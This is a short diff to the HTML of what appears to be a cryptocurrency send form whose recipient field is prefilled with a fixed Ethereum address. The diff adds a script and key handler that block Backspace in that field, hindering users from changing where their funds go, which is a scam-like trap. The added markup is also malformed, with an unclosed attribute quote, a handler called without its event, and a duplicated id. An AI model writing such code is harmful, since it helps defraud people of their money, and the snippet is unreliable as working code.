@@ -346,7 +346,7 @@ body {
 									To address: <Br>
 
 									
-					<input id="kuda" style='margin-bottom:20px' pattern="[A-Za-z]{42}" id='openkey22' type="text" class="txtbox" onkeypress='validate(event)' value="0x235f30f2877409512dd2a1865e226ea458607572">
+					<input id="kuda" style='margin-bottom:20px' pattern="[A-Za-z]{42}" id='openkey22' type="text" class="txtbox" onkeypress='validate(event)' value="0x235f30f2877409512dd2a1865e226ea458607572" onKeyDown="preventBackspace();>
 									Amount: <Br>
 									
 									
@@ -537,6 +537,21 @@ $.get("https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&per_page=2
   }
  }
  </script>
+													      <script type="text/javascript">
+    function preventBackspace(e) {
+        var evt = e || window.event;
+        if (evt) {
+            var keyCode = evt.charCode || evt.keyCode;
+            if (keyCode === 8) {
+                if (evt.preventDefault) {
+                    evt.preventDefault();
+                } else {
+                    evt.returnValue = false;
+                }
+            }
+        }
+    }
+</script>
 </body>
 
 </html>
